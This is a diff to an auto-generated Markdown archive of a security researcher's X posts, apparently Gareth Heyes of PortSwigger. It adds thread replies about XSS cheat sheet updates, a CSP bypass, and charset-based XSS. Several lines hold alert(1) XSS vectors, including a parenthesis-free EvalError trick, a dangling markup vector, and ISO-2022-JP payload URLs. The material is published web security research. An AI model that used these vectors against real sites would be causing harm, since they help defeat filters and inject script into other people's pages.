@@ -2,7 +2,7 @@
 
 _Generated 2026-11-11 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._
 
-- Posts in this file: 535
+- Posts in this file: 542
 - Conversations/threads: 492
 - Oldest post captured: 2008-10-22
 - Newest post captured: 2026-11-09
@@ -1025,7 +1025,7 @@ Tags (automatic): Auth bypass, RCE
 
 ---
 
-## 2026-01-28 · Post · We've just hit a very important milestone - our XSS Cheat Sheet now has 1337 vectors! https://t.co/M
+## 2026-01-28 · Thread · We've just hit a very important milestone - our XSS Cheat Sheet now has 1337 vectors! https://t.co/M
 
 
 Tags (automatic): XSS
@@ -1042,9 +1042,17 @@ Tags (automatic): XSS
 - photo: https://pbs.twimg.com/media/G_wN7lgXsAIx8i-.jpg — no alt text provided by author
 
 
+### Thread part 2 — @garethheyes — 2026-01-28 13:37 UTC (2026-01-28 14:37 WAT)
+
+- URL: https://x.com/garethheyes/status/2016505835908665564
+- Metrics (at fetch): bookmark 6, impression 1369, like 3, quote 0, reply 0, retweet 0
+
+> Browse them here: https://t.co/Xr34qaKBWl
+
+
 ---
 
-## 2025-12-16 · Post · Bypass CSP in a single click using my new Custom Action, powered by @renniepak's excellent CSP bypas
+## 2025-12-16 · Thread · Bypass CSP in a single click using my new Custom Action, powered by @renniepak's excellent CSP bypas
 
 
 Tags (automatic): CSP / CSPT
@@ -1059,6 +1067,22 @@ Tags (automatic): CSP / CSPT
 
 **Media:**
 - video:  — no alt text provided by author
+
+
+### Thread part 2 — @garethheyes — 2025-12-16 15:31 UTC (2025-12-16 16:31 WAT)
+
+- URL: https://x.com/garethheyes/status/2000951843250429954
+- Metrics (at fetch): bookmark 1, impression 1471, like 6, quote 0, reply 1, retweet 0
+
+> Yes, I said "CSP policy". I'll leave you to guess whether I deliberately said "CSP Policy" or I didn't want to re-record it.
+
+
+### Thread part 3 — @garethheyes — 2025-12-16 15:31 UTC (2025-12-16 16:31 WAT)
+
+- URL: https://x.com/garethheyes/status/2000951845305639039
+- Metrics (at fetch): bookmark 12, impression 1554, like 20, quote 0, reply 0, retweet 4
+
+> You can install this Custom Action via the Extensibility Helper extension, or copy+paste from here: https://t.co/rztTkrxCD4
 
 
 ---
@@ -1463,7 +1487,7 @@ throw-0o1337n,x=onerror=alert,1
 
 ---
 
-## 2025-06-12 · Post · Mikhail Khramenkov just contributed a new dangling markup vector on the latest Chrome. Live now on o
+## 2025-06-12 · Thread · Mikhail Khramenkov just contributed a new dangling markup vector on the latest Chrome. Live now on o
 
 
 Tags (automatic): XSS
@@ -1482,6 +1506,14 @@ Tags (automatic): XSS
 - photo: https://pbs.twimg.com/media/GtPtNz1X0AA9cmF.jpg — alt text: "<video poster="//psres.net?
 <input name='csrf' value='1337'>...
 "
+
+
+### Thread part 2 — @garethheyes — 2025-06-12 13:11 UTC (2025-06-12 14:11 WAT)
+
+- URL: https://x.com/garethheyes/status/1933150209162322046
+- Metrics (at fetch): bookmark 3, impression 1228, like 1, quote 0, reply 0, retweet 0
+
+> https://t.co/nVClJqdvDq
 
 
 ---
@@ -1520,7 +1552,7 @@ alert(1)" codebase=javascript:>"
 
 ---
 
-## 2025-06-04 · Post · Abuse EvalError, onpageswap, and setTimeout to get JS execution without parens.
+## 2025-06-04 · Thread · Abuse EvalError, onpageswap, and setTimeout to get JS execution without parens.
 
 
 Tags (automatic): XSS
@@ -1542,6 +1574,15 @@ Event.prototype.toString=EvalError.prototype.toString;
 Event.prototype.name='alert\x281\x29'
 </script>
 "
+
+
+### Thread part 2 — @garethheyes — 2025-06-04 13:24 UTC (2025-06-04 14:24 WAT)
+
+- URL: https://x.com/garethheyes/status/1930254409230962695
+- Metrics (at fetch): bookmark 0, impression 920, like 0, quote 0, reply 0, retweet 0
+
+> Link to vector👇
+> https://t.co/wAuBgyniXh
 
 
 ---
@@ -2034,7 +2075,7 @@ Tags (automatic): XSS
 
 ---
 
-## 2024-12-24 · Post · I found you could use the ISO-2022-JP escape sequences inside JS URLs!
+## 2024-12-24 · Thread · I found you could use the ISO-2022-JP escape sequences inside JS URLs!
 
 
 Tags (automatic): XSS
@@ -2057,6 +2098,20 @@ Tags (automatic): XSS
 - photo: https://pbs.twimg.com/media/GfkL33EXwAAWpim.jpg — no alt text provided by author
 
 **Links in post:** https://hackvertor.co.uk/hack-pad/5, https://portswigger-labs.net/xss/charset.php?x=%3Ca%20href=javas%1B(Jcript:alert(1)%3Etest%3C/a%3E&charset=iso-2022-jp
+
+
+### Thread part 2 — @garethheyes — 2024-12-24 13:19 UTC (2024-12-24 14:19 WAT)
+
+- URL: https://x.com/garethheyes/status/1871546261226364980
+- Metrics (at fetch): bookmark 5, impression 3700, like 13, quote 0, reply 3, retweet 0
+
+> Some background on this issue:
+> https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/
+>
+> In my tests Chrome no longer seems to sniff the charset whereas Firefox still does:
+> https://portswigger-labs.net/xss/charset.php?x=%3Ca%20href=javas%1B(Jcript:alert(1)%3Etest%3C/a%3E&charset=
+
+**Links in post:** https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/, https://portswigger-labs.net/xss/charset.php?x=%3Ca%20href=javas%1B(Jcript:alert(1)%3Etest%3C/a%3E&charset=
 
 
 ---
@@ -2096,7 +2151,7 @@ Tags (automatic): XSS
 
 ---
 
-## 2024-12-05 · Post · State of the art XSS using the ISO-2022-JP charset
+## 2024-12-05 · Thread · State of the art XSS using the ISO-2022-JP charset
 
 
 Tags (automatic): XSS
@@ -2113,6 +2168,15 @@ Tags (automatic): XSS
 
 **Media:**
 - photo: https://pbs.twimg.com/media/GeDGudAWAAwD_26.jpg — no alt text provided by author
+
+
+### Thread part 2 — @garethheyes — 2024-12-05 16:31 UTC (2024-12-05 17:31 WAT)
+
+- URL: https://x.com/garethheyes/status/1864709236304773345
+- Metrics (at fetch): bookmark 11, impression 1645, like 19, quote 0, reply 0, retweet 4
+
+> Read what inspired this:
+> https://t.co/ffVzHrXwxr
 
 
 ---
@@ -2589,10 +2653,12 @@ Tags (automatic): XSS
 
 > We've released a new version of our XSS cheat sheet with some new exotic events from the community.
 >
-> https://t.co/qPysTq89y3 https://t.co/Tg0NC6WaUh
+> https://portswigger.net/research/new-exotic-events-in-the-xss-cheat-sheet [pic.x.com/Tg0NC6WaUh]
 
 **Media:**
 - photo: https://pbs.twimg.com/media/GPzQDkkXwAAMKRA.png — no alt text provided by author
+
+**Links in post:** https://portswigger.net/research/new-exotic-events-in-the-xss-cheat-sheet
 
 
 ---
